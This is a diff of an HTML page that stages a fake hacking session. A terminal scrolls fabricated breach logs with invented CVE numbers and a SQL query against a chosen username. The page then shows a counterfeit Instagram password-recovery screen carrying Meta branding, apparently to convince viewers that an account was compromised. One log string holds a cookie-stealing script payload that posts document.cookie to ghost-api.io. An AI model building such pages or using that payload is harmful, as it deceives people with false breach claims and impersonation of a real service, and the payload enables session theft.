@@ -1,316 +1,476 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accès Système • Récupération</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GHOST_V9_EXTREME</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        :root {
+            --term-green: #00ff41;
+            --term-yellow: #ffdf00;
+            --term-red: #ff3e3e;
+            --term-bg: #050505;
+            --insta-blue: #0095f6;
+            --insta-grey: #8e8e8e;
+        }
+
+        body, html {
+            margin: 0; padding: 0;
+            background-color: var(--term-bg);
+            font-family: 'Courier New', Courier, monospace;
+            height: 100%;
             overflow-x: hidden;
         }
 
-        /* --- TERMINAL HACKER --- */
-        #terminal-screen {
-            background-color: #0c0c0c;
-            width: 100%;
-            height: 100vh;
-            color: #00ff41;
-            font-family: 'Courier New', Courier, monospace;
-            padding: 20px;
-            box-sizing: border-box;
+        /* --- TERMINAL --- */
+        #terminal-container {
             display: flex;
             flex-direction: column;
-            justify-content: flex-start;
+            height: 100vh;
+            padding: 10px;
+            box-sizing: border-box;
+            overflow: hidden;
+            background-color: var(--term-bg);
         }
 
-        .command-line { margin-bottom: 10px; }
-        .cursor { display: inline-block; width: 10px; height: 18px; background: #00ff41; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+        #history {
+            flex-grow: 1;
+            overflow-y: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+
+        .log-line { 
+            margin-bottom: 1px; 
+            line-height: 1.1; 
+            font-size: 10px; 
+            word-break: break-all; 
+            white-space: pre-wrap; 
+            color: var(--term-green); 
+            width: 100%;
+        }
+        .red { color: var(--term-red); font-weight: bold; }
+        .yellow { color: var(--term-yellow); }
+        .blue { color: #5bc0de; }
+        .gray { color: #666; }
         
-        #terminal-input {
+        .input-line { 
+            display: flex; 
+            align-items: center; 
+            margin-top: 5px; 
+            background: rgba(10,10,10,0.98); 
+            padding: 15px; 
+            border-top: 1px solid #333; 
+            font-family: 'Courier New', monospace;
+        }
+        .prompt { margin-right: 10px; white-space: nowrap; color: var(--term-green); font-weight: bold; }
+        
+        #user-input {
             background: transparent;
             border: none;
-            color: #00ff41;
-            font-family: inherit;
-            font-size: 16px;
+            color: var(--term-green);
+            font-family: 'Courier New', monospace;
+            font-size: 15px;
             outline: none;
-            width: 80%;
-        }
-
-        #code-display {
-            font-size: 12px;
-            line-height: 1.2;
-            white-space: pre-wrap;
-            overflow-y: hidden;
             flex-grow: 1;
         }
 
-        .progress-container { width: 100%; border: 1px solid #00ff41; height: 20px; margin-top: 10px; display: none; }
-        .progress-bar { width: 0%; height: 100%; background: #00ff41; transition: width 0.1s; }
-
-        /* --- CONTENEUR GLOBAL --- */
-        .container {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 40px 30px;
-            width: 100%;
-            max-width: 350px;
-            text-align: center;
-            box-sizing: border-box;
+        /* --- INSTAGRAM RECOVERY UI (Standard Fonts) --- */
+        #insta-ui {
             display: none;
+            background-color: #fafafa;
+            min-height: 100vh;
+            flex-direction: column;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        .container.active { display: block; }
 
-        /* --- STYLE INSTAGRAM --- */
-        h1 { font-size: 24px; font-weight: bold; margin-bottom: 15px; color: #262626; }
-        p { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
-        
-        .profile-display {
+        .insta-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            max-width: 388px;
+            width: 100%;
+            margin-top: 44px;
+            padding-bottom: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .profile-pic-circle {
             width: 150px;
             height: 150px;
             border-radius: 50%;
-            border: 1px solid #dbdbdb;
-            margin: 0 auto 15px;
+            border: 1px solid #efefef;
+            margin: 24px 0 12px 0;
             overflow: hidden;
-            background-color: #efefef;
-            position: relative;
-        }
-        
-        .profile-display img { width: 100%; height: 100%; object-fit: cover; }
-        .username-text { font-weight: 600; font-size: 18px; margin-bottom: 20px; color: #262626; }
-
-        input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background-color: #fafafa;
-            box-sizing: border-box;
-            margin-bottom: 15px;
-        }
-
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: 600;
             cursor: pointer;
+            background: #fafafa;
         }
 
-        /* --- CROPPER STYLES --- */
-        .crop-container {
-            width: 200px;
-            height: 200px;
+        .profile-pic-circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .insta-input {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            font-size: 14px;
+            padding: 14px;
+            width: 100%;
+            outline: none;
+        }
+
+        .recovery-option {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .recovery-option:active { background: #f2f2f2; }
+
+        .radio-dot {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #dbdbdb;
             border-radius: 50%;
-            border: 2px dashed #dbdbdb;
-            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .radio-dot.active { border-color: var(--insta-blue); }
+        .radio-dot.active::after {
+            content: "";
+            width: 14px;
+            height: 14px;
+            background: var(--insta-blue);
+            border-radius: 50%;
+        }
+
+        /* --- PHOTO ADJUSTER --- */
+        #photo-adjuster {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 5000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .crop-circle {
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            border: 2px solid #fff;
             overflow: hidden;
             position: relative;
-            background: #fafafa;
-            cursor: move;
+            touch-action: none;
         }
-        #profile-preview { position: absolute; cursor: grab; display: none; transform-origin: center; }
-        .zoom-controls { margin-bottom: 20px; }
-        
-        .hidden { display: none !important; }
+
+        .crop-circle img {
+            position: absolute;
+            top: 0; left: 0;
+            transform-origin: center;
+            max-width: none;
+        }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- SECTION 1: LE TERMINAL -->
-    <div id="terminal-screen">
-        <div id="output">
-            <div class="command-line">root@system:~# INITIALIZING_HACK_V3...</div>
-            <div class="command-line">root@system:~# ENTER_TARGET_USERNAME: <input type="text" id="terminal-input" autofocus autocomplete="off"></div>
+    <!-- TERMINAL SECTION -->
+    <div id="terminal-container">
+        <div id="history">
+            <div class="log-line yellow">[SYSTEM] INITIALIZING GHOST_PROTOCOL CORE v9.5...</div>
+            <div class="log-line gray">[DEBUG] Loading modules: crypto_aes, socket_proxy, inject_v8, mask_ui...</div>
+            <div class="log-line">Waiting for target parameters. [USERNAME EMAIL PHONE IMAGE_URL]</div>
         </div>
-        <div id="code-display"></div>
-        <div class="progress-container" id="progress-box">
-            <div class="progress-bar" id="progress-bar"></div>
+        <div class="input-line" id="input-area">
+            <span class="prompt">root@ghost:~#</span>
+            <input type="text" id="user-input" autofocus autocomplete="off" spellcheck="false">
         </div>
-        <button id="terminal-ok-btn" class="hidden" style="background:#00ff41; color:#000; margin-top:20px; width:auto; padding: 10px 40px;">OK</button>
     </div>
 
-    <!-- SECTION 2: AJUSTEMENT PHOTO -->
-    <div id="photo-screen" class="container">
-        <h1>Photo de profil</h1>
-        <p>Ajustez votre photo de profil librement.</p>
-        <div class="crop-container" id="crop-area">
-            <img id="profile-preview" src="" alt="Aperçu">
-            <div id="no-photo-text" style="color:#ccc; padding-top: 80px;">Aucune photo</div>
-        </div>
-        <div class="zoom-controls">
-            <input type="range" id="zoom-slider" min="0.1" max="4" step="0.01" value="1" style="width: 80%;">
-        </div>
-        <input type="file" id="file-input" accept="image/*" class="hidden">
-        <button onclick="document.getElementById('file-input').click()" style="background:#efefef; color:#262626; margin-bottom:10px;">Choisir photo</button>
-        <button id="goto-final-btn">Continuer</button>
+    <!-- INSTAGRAM UI SECTION -->
+    <div id="insta-ui">
+        <main class="flex-grow flex flex-col items-center w-full px-4">
+            
+            <div class="insta-box" id="selection-box">
+                <div class="p-8 sm:px-10 flex flex-col items-center w-full">
+                    <div class="profile-pic-circle" onclick="openAdjuster()">
+                        <img class="synced-img" src="" alt="Profile">
+                    </div>
+                    <h2 class="display-name-text text-xl font-semibold text-[#262626] mb-2">username</h2>
+                    <p class="text-sm text-[#8e8e8e] mb-8 leading-tight">
+                        Choose where we should send a login link or security code to get back into your account.
+                    </p>
+                    <div class="w-full mb-6">
+                        <div class="recovery-option" onclick="setRadio(0)">
+                            <div class="flex flex-col items-start">
+                                <span class="text-sm font-semibold">Send an email</span>
+                                <span id="display-mail" class="text-xs text-gray-500">••••••••ti@gmail.com</span>
+                            </div>
+                            <div class="radio-dot active" id="dot-0"></div>
+                        </div>
+                        <div class="recovery-option" onclick="setRadio(1)">
+                            <div class="flex flex-col items-start">
+                                <span class="text-sm font-semibold">Send an SMS</span>
+                                <span id="display-phone" class="text-xs text-gray-500">••••••••11</span>
+                            </div>
+                            <div class="radio-dot" id="dot-1"></div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-[#0095f6] text-white font-bold py-3 rounded-xl text-sm mb-4" onclick="showPasswordPage()">
+                        Send login link
+                    </button>
+                    <div class="flex items-center w-full my-4 text-[#8e8e8e] text-xs font-bold uppercase">
+                        <div class="flex-grow border-t border-gray-300"></div>
+                        <span class="px-4">or</span>
+                        <div class="flex-grow border-t border-gray-300"></div>
+                    </div>
+                    <a href="#" class="text-sm font-semibold text-[#00376b] mb-4">Can't reset your password?</a>
+                </div>
+                <div class="w-full bg-[#fafafa] border-t border-gray-300 py-4 cursor-pointer" onclick="location.reload()">
+                    <span class="text-sm font-semibold text-[#262626]">Back to login</span>
+                </div>
+            </div>
+
+            <div class="insta-box hidden" id="password-box">
+                <div class="p-8 sm:px-10 flex flex-col items-center w-full">
+                    <div class="profile-pic-circle" onclick="openAdjuster()">
+                        <img class="synced-img" src="" alt="Profile">
+                    </div>
+                    <h2 class="display-name-text text-xl font-semibold text-[#262626] mb-2">username</h2>
+                    <h3 class="text-lg font-semibold my-2">Create a strong password</h3>
+                    <p class="text-sm text-[#8e8e8e] mb-8">Your password must be at least 6 characters long and should include a mix of numbers, letters and special characters.</p>
+                    <input type="password" placeholder="New password" class="insta-input mb-3">
+                    <input type="password" placeholder="Confirm new password" class="insta-input mb-6">
+                    <button class="w-full bg-[#0095f6] text-white font-bold py-3 rounded-xl text-sm mb-4" onclick="finish()">
+                        Reset password
+                    </button>
+                </div>
+                <div class="w-full bg-[#fafafa] border-t border-gray-300 py-4 cursor-pointer" onclick="goBackToSelection()">
+                    <span class="text-sm font-semibold text-[#262626]">Back to login</span>
+                </div>
+            </div>
+
+            <div class="insta-box hidden" id="success-box">
+                <div class="p-10 flex flex-col items-center w-full">
+                    <div class="w-16 h-16 border-4 border-green-500 rounded-full flex items-center justify-center mb-4">
+                        <span class="text-green-500 text-3xl font-bold">✓</span>
+                    </div>
+                    <h2 class="text-xl font-semibold mb-2">Password changed</h2>
+                    <p class="text-sm text-[#8e8e8e] mb-6 text-center">Your account password has been successfully updated.</p>
+                    <button class="w-full bg-[#0095f6] text-white font-bold py-3 rounded-xl text-sm" onclick="location.reload()">
+                        Log in
+                    </button>
+                </div>
+            </div>
+
+            <footer class="mt-auto py-8 w-full">
+                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-[#8e8e8e] font-semibold mb-4">
+                    <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>API</span><span>Privacy</span><span>Terms</span><span>Locations</span><span>Instagram Lite</span><span>Threads</span>
+                </div>
+                <p class="text-center text-xs text-[#8e8e8e]">© 2024 Instagram from Meta</p>
+            </footer>
+        </main>
     </div>
 
-    <!-- SECTION 3: RÉCUPÉRATION FINALE INSTAGRAM -->
-    <div id="final-screen" class="container">
-        <h1>Récupération</h1>
-        <div class="profile-display" id="final-photo-container">
-            <!-- La photo ajustée sera injectée ici -->
+    <!-- PHOTO ADJUSTER OVERLAY -->
+    <div id="photo-adjuster">
+        <div class="crop-circle" id="touch-zone">
+            <img id="adjust-img" src="">
         </div>
-        <div class="username-text" id="final-username">@utilisateur</div>
-        <p>Veuillez choisir un nouveau mot de passe sécurisé pour votre compte.</p>
-        <input type="password" placeholder="Nouveau mot de passe">
-        <button onclick="alert('Mot de passe mis à jour !')">Réinitialiser le mot de passe</button>
+        <div class="text-center mt-8 text-white">
+            <h3 class="font-bold text-lg mb-1 uppercase">Adjust Photo</h3>
+            <p class="text-sm opacity-60">Pinch to zoom • Drag to move</p>
+        </div>
+        <button class="mt-10 px-12 py-3 bg-white text-black font-bold rounded-full text-sm" onclick="closeAdjuster()">DONE</button>
     </div>
 
 <script>
-    // --- VARIABLES D'ÉTAT ---
-    let username = "";
-    let photoData = { src: "", x: 0, y: 0, scale: 1 };
-    
-    // --- LOGIQUE TERMINAL ---
-    const termInput = document.getElementById('terminal-input');
-    const codeDisplay = document.getElementById('code-display');
-    const progressBox = document.getElementById('progress-box');
-    const progressBar = document.getElementById('progress-bar');
-    const terminalBtn = document.getElementById('terminal-ok-btn');
+    let config = { user: "", mail: "", phone: "", img: "", x: 0, y: 0, scale: 1 };
+    const userInput = document.getElementById('user-input');
+    const history = document.getElementById('history');
 
-    termInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter' && this.value.trim() !== "") {
-            username = this.value;
-            this.disabled = true;
-            startHacking();
+    userInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            const val = userInput.value.trim();
+            userInput.value = "";
+            addLog(`<span class="prompt">root@ghost:~#</span> ${val}`);
+            processCmd(val);
         }
     });
 
-    function startHacking() {
-        progressBox.style.display = 'block';
-        const lines = [
-            "CONNECTING TO INSTA_SERVER_X99...", "BYPASSING FIREWALL...", "ACCESSING DATABASE...",
-            "ENCRYPTING SQL_INJECTION...", "DECRYPTING USER_DATA...", "FETCHING RSA_KEYS...",
-            "HANDSHAKE SUCCESSFUL", "EXTRACTING PROFILE_INFO...", "PAYLOAD DELIVERED."
+    function addLog(text, type = "") {
+        const div = document.createElement('div');
+        div.className = "log-line " + type;
+        div.innerHTML = text;
+        history.appendChild(div);
+        if (history.children.length > 500) history.removeChild(history.firstChild);
+    }
+
+    function processCmd(inputStr) {
+        if (inputStr.toLowerCase() === 'run') { startHacking(); return; }
+        const parts = inputStr.split(/\s+/);
+        parts.forEach(p => {
+            if (p.includes('@')) config.mail = p;
+            else if (p.startsWith('http')) config.img = p;
+            else if (/^\d+$/.test(p)) config.phone = p;
+            else if (p.length > 2) config.user = p;
+        });
+        addLog(`[OK] PARAMS_SET: target="${config.user || 'none'}"`, "yellow");
+    }
+
+    function setRadio(idx) {
+        document.getElementById('dot-0').classList.toggle('active', idx === 0);
+        document.getElementById('dot-1').classList.toggle('active', idx === 1);
+    }
+
+    async function startHacking() {
+        document.getElementById('input-area').style.display = 'none';
+        
+        let linesCount = 0;
+        const totalLines = 13500;
+        
+        const getTimestamp = () => {
+            const now = new Date();
+            return `[${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}]`;
+        };
+
+        const logTypes = [
+            () => `${getTimestamp()} [INFO] Scanning memory block 0x${Math.random().toString(16).substr(2,8).toUpperCase()}... OK`,
+            () => `${getTimestamp()} [DEBUG] socket_proxy.c:122 - connection established via gateway ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1.1`,
+            () => `${getTimestamp()} [WARN] High entropy detected in packet stream. Re-routing through TOR_NODE_${Math.floor(Math.random()*999)}`,
+            () => `${getTimestamp()} [ERROR] AUTH_FAIL: Re-attempting bypass using CVE-2024-${Math.floor(Math.random()*9999)} on endpoint /v1/auth/recovery`,
+            () => `    >> EXTRACTING: {"id":"${Math.random().toString(36).substr(2,10)}", "token":"${Math.random().toString(16).repeat(4)}", "expired":false}`,
+            () => `------------------------------------------------------------------------------------------------------------------------------------------------`,
+            () => `${getTimestamp()} [DATA_DUMP] BEGIN RSA_KEY_PARTIAL: ` + "A".repeat(Math.random()*100) + Math.random().toString(36).repeat(10).toUpperCase(),
+            () => `${getTimestamp()} [SQL] SELECT * FROM users WHERE username = '${config.user}' AND status = 'active'; -- FETCH_SIZE: ${Math.floor(Math.random()*1000)}`,
+            () => `[X] PAYLOAD_INJECTED: <script>fetch('https://ghost-api.io/collect?d=' + btoa(document.cookie))<\/script>`,
+            () => `${getTimestamp()} [SYSTEM] Cleaning temporary logs in /tmp/.ghost_cache_${Math.random().toString(36).substr(2,5)}... done.`
         ];
-        
-        let i = 0;
-        let progress = 0;
-        
-        const interval = setInterval(() => {
-            // Ajouter du code aléatoire
-            const randomCode = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-            codeDisplay.innerHTML += `<div>${lines[i % lines.length]} - ${randomCode}</div>`;
-            codeDisplay.scrollTop = codeDisplay.scrollHeight;
-            
-            progress += 1.5;
-            progressBar.style.width = progress + "%";
-            
-            if (progress >= 100) {
-                clearInterval(interval);
-                terminalBtn.classList.remove('hidden');
-            }
-            i++;
-        }, 50);
+
+        return new Promise((resolve) => {
+            const timer = setInterval(() => {
+                const batchSize = Math.floor(Math.random() * 20) + 10;
+                for(let i=0; i<batchSize; i++) {
+                    const typeIndex = Math.floor(Math.random() * logTypes.length);
+                    const text = logTypes[typeIndex]();
+                    let color = "";
+                    if (text.includes("[ERROR]")) color = "red";
+                    else if (text.includes("[WARN]")) color = "yellow";
+                    else if (text.includes("[DEBUG]")) color = "gray";
+                    else if (text.includes("[INFO]")) color = "blue";
+                    
+                    addLog(text, color);
+                    linesCount++;
+                }
+
+                if(linesCount >= totalLines) {
+                    clearInterval(timer);
+                    addLog("\n[!!!] BREACH COMPLETE. HANDSHAKE CAPTURED. INITIALIZING UI BYPASS...", "red");
+                    setTimeout(initUI, 1500);
+                }
+            }, 30);
+        });
     }
 
-    terminalBtn.addEventListener('click', () => {
-        document.getElementById('terminal-screen').style.display = 'none';
-        document.getElementById('photo-screen').classList.add('active');
-    });
+    function initUI() {
+        document.getElementById('terminal-container').style.display = 'none';
+        document.getElementById('insta-ui').style.display = 'flex';
+        
+        document.querySelectorAll('.display-name-text').forEach(el => {
+            el.innerText = config.user || "username";
+        });
 
-    // --- LOGIQUE PHOTO (CROPPER) ---
-    const fileInput = document.getElementById('file-input');
-    const preview = document.getElementById('profile-preview');
-    const zoomSlider = document.getElementById('zoom-slider');
-    const cropArea = document.getElementById('crop-area');
-    const noPhotoText = document.getElementById('no-photo-text');
+        document.getElementById('display-mail').innerText = maskMail(config.mail || "target@gmail.com");
+        document.getElementById('display-phone').innerText = maskPhone(config.phone || "0788994411");
+        
+        const imgs = document.querySelectorAll('.synced-img, #adjust-img');
+        imgs.forEach(i => i.src = config.img || "https://i.imgur.com/8K67p8K.png");
+        updatePhotos();
+    }
 
-    let isDragging = false;
-    let startX, startY;
+    function maskMail(val) {
+        if (!val) return "••••••••ti@gmail.com";
+        const parts = val.split('@');
+        const namePart = parts[0];
+        const domainPart = parts[1] || "gmail.com";
+        const suffix = namePart.slice(-2);
+        return "••••••••" + suffix + "@" + domainPart;
+    }
 
-    fileInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = (event) => {
-                preview.src = event.target.result;
-                preview.style.display = 'block';
-                noPhotoText.style.display = 'none';
-                photoData.src = event.target.result;
-                resetPhoto();
-            };
-            reader.readAsDataURL(file);
+    function maskPhone(val) {
+        if (!val) return "••••••••11";
+        const suffix = val.slice(-2);
+        return "••••••••" + suffix;
+    }
+
+    // Photo Adjustment Logic
+    let isDragging = false, startX, startY, initDist = null, initScale = 1;
+    function updatePhotos() {
+        const trans = `translate(${config.x}px, ${config.y}px) scale(${config.scale})`;
+        document.querySelectorAll('.synced-img, #adjust-img').forEach(img => {
+            img.style.transform = trans;
+        });
+    }
+    function openAdjuster() { document.getElementById('photo-adjuster').style.display = 'flex'; }
+    function closeAdjuster() { document.getElementById('photo-adjuster').style.display = 'none'; }
+
+    const zone = document.getElementById('touch-zone');
+    const move = (e) => {
+        const c = e.touches ? e.touches[0] : e;
+        if (e.touches && e.touches.length === 2) {
+            const d = Math.hypot(e.touches[0].clientX - e.touches[1].clientX, e.touches[0].clientY - e.touches[1].clientY);
+            if (!initDist) { initDist = d; initScale = config.scale; }
+            config.scale = initScale * (d / initDist);
+        } else if (isDragging) {
+            config.x = c.clientX - startX;
+            config.y = c.clientY - startY;
         }
+        updatePhotos();
+    };
+    zone.addEventListener('mousedown', (e) => { isDragging = true; startX = e.clientX - config.x; startY = e.clientY - config.y; });
+    zone.addEventListener('touchstart', (e) => { 
+        if(e.touches.length === 1) { isDragging = true; startX = e.touches[0].clientX - config.x; startY = e.touches[0].clientY - config.y; }
     });
+    window.addEventListener('mousemove', move);
+    window.addEventListener('touchmove', (e) => { if(e.target.closest('#touch-zone')) e.preventDefault(); move(e); }, {passive:false});
+    window.addEventListener('mouseup', () => isDragging = false);
+    window.addEventListener('touchend', () => { isDragging = false; initDist = null; });
 
-    function resetPhoto() {
-        photoData.x = 0; photoData.y = 0; photoData.scale = 1;
-        zoomSlider.value = 1;
-        updateTransform();
+    function showPasswordPage() {
+        document.getElementById('selection-box').classList.add('hidden');
+        document.getElementById('password-box').classList.remove('hidden');
+    }
+    
+    function goBackToSelection() {
+        document.getElementById('password-box').classList.add('hidden');
+        document.getElementById('selection-box').classList.remove('hidden');
     }
 
-    function updateTransform() {
-        preview.style.transform = `translate(${photoData.x}px, ${photoData.y}px) scale(${photoData.scale})`;
+    function finish() {
+        document.getElementById('password-box').classList.add('hidden');
+        document.getElementById('success-box').classList.remove('hidden');
     }
-
-    zoomSlider.addEventListener('input', (e) => {
-        photoData.scale = e.target.value;
-        updateTransform();
-    });
-
-    // Drag Logic
-    const startDrag = (e) => {
-        if(!preview.src) return;
-        isDragging = true;
-        const cX = e.type.includes('touch') ? e.touches[0].clientX : e.clientX;
-        const cY = e.type.includes('touch') ? e.touches[0].clientY : e.clientY;
-        startX = cX - photoData.x;
-        startY = cY - photoData.y;
-    };
-    const doDrag = (e) => {
-        if(!isDragging) return;
-        const cX = e.type.includes('touch') ? e.touches[0].clientX : e.clientX;
-        const cY = e.type.includes('touch') ? e.touches[0].clientY : e.clientY;
-        photoData.x = cX - startX;
-        photoData.y = cY - startY;
-        updateTransform();
-    };
-    const endDrag = () => isDragging = false;
-
-    cropArea.addEventListener('mousedown', startDrag);
-    window.addEventListener('mousemove', doDrag);
-    window.addEventListener('mouseup', endDrag);
-    cropArea.addEventListener('touchstart', startDrag);
-    window.addEventListener('touchmove', doDrag);
-    window.addEventListener('touchend', endDrag);
-
-    // --- LOGIQUE FINALE ---
-    const gotoFinalBtn = document.getElementById('goto-final-btn');
-    const finalScreen = document.getElementById('final-screen');
-    const finalPhotoContainer = document.getElementById('final-photo-container');
-    const finalUsername = document.getElementById('final-username');
-
-    gotoFinalBtn.addEventListener('click', () => {
-        // On prépare l'interface finale
-        finalUsername.innerText = "@" + username;
-        
-        // On clone la preview pour garder le cadrage (visual-only pour la démo)
-        const finalImg = preview.cloneNode();
-        finalImg.style.position = 'absolute';
-        finalImg.style.width = '100%'; 
-        finalImg.style.height = 'auto';
-        
-        // On vide et on remplit le cercle final
-        finalPhotoContainer.innerHTML = "";
-        finalPhotoContainer.appendChild(finalImg);
-        
-        document.getElementById('photo-screen').classList.remove('active');
-        finalScreen.classList.add('active');
-    });
-
 </script>
 </body>
 </html>
